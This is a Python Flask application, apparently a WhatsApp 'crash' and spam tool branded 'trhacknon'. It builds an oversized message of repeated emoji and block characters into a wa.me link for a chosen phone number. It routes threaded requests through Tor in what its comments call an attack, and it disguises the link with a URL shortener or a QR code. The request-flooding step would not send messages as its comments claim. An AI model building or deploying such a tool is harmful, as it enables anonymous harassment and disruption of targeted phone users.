# app.py

from flask import Flask, render_template, request, jsonify
import threading, time, requests, qrcode, urllib.parse, os
from io import BytesIO
from base64 import b64encode

app = Flask(__name__)

# Variables de configuration
USE_TOR = True
PROXIES = {
    "http": "socks5h://127.0.0.1:9050",
    "https": "socks5h://127.0.0.1:9050"
} if USE_TOR else {}

# Fonction pour générer le message massif
def generate_massive_message():
    base = [
        "*trhacknon*", "BOOM", "CRASH", "WHATSAPP", "SPAM", "██", "▒▒", "░░",
        "⚠️", "🚫", "⛔", "🚨", "🔥", "⚡", "🛑", "😈", "👾", "👽",
        "☠️", "🌀", "📛", "🧠", "🔒", "💣", "🔗"
    ]
    repeat_block = "%0A".join([f"{word} " * 10 for word in base])
    return (repeat_block + "%0A") * 30 + "GitHub: https://github.com/trh4ckn0n"

# Route principale
@app.route('/')
def index():
    return render_template('index.html')

# Route pour lancer l'attaque
@app.route('/generate', methods=['POST'])
def generate():
    data = request.json
    phone = data.get('phone')
    threads = int(data.get('threads', 10))  # Nombre de threads
    message = generate_massive_message()
    encoded = urllib.parse.quote(message)  # Encodage du message
    wa_url = f"https://wa.me/{phone}?text={encoded}"  # URL WhatsApp avec le message

    # Fonction pour lancer l'attaque avec plusieurs threads
    def threaded_attack():
        for _ in range(threads):
            threading.Thread(target=lambda: requests.get(wa_url, proxies=PROXIES)).start()
            time.sleep(0.8)

    threading.Thread(target=threaded_attack).start()  # Lancer l'attaque dans un thread séparé
    preview = f"Message : trhacknon vous explose + spam visuel\nURL : {wa_url}"  # Aperçu du message
    return jsonify({"status": "sent", "url": wa_url, "preview": preview})

# Route pour raccourcir le lien
@app.route('/shorten', methods=['POST'])
def shorten():
    data = request.json
    phone = data.get('phone')
    message = generate_massive_message()
    encoded = urllib.parse.quote(message)
    wa_url = f"https://wa.me/{phone}?text={encoded}"

    try:
        r = requests.get(f"https://tinyurl.com/api-create.php?url={wa_url}", proxies=PROXIES, timeout=10)
        return jsonify({"short_url": r.text if r.status_code == 200 else wa_url})
    except Exception as e:
        return jsonify({"error": str(e)})

# Route pour générer un QR code
@app.route('/qr', methods=['POST'])
def generate_qr():
    data = request.json
    phone = data.get('phone')
    message = generate_massive_message()
    encoded = urllib.parse.quote(message)
    wa_url = f"https://wa.me/{phone}?text={encoded}"

    # Création du QR code
    qr = qrcode.QRCode(box_size=6, border=2)
    qr.add_data(wa_url)
    qr.make(fit=True)
    img = qr.make_image(fill_color="lime", back_color="black")

    # Conversion du QR code en image base64
    buffered = BytesIO()
    img.save(buffered, format="PNG")
    img_str = b64encode(buffered.getvalue()).decode()
    return jsonify({"qr": f"data:image/png;base64,{img_str}", "wa_url": wa_url})

# Lancer l'application Flask
if __name__ == '__main__':
    app.run(debug=False, host="0.0.0.0", port=int(os.environ.get("PORT", 5000)))
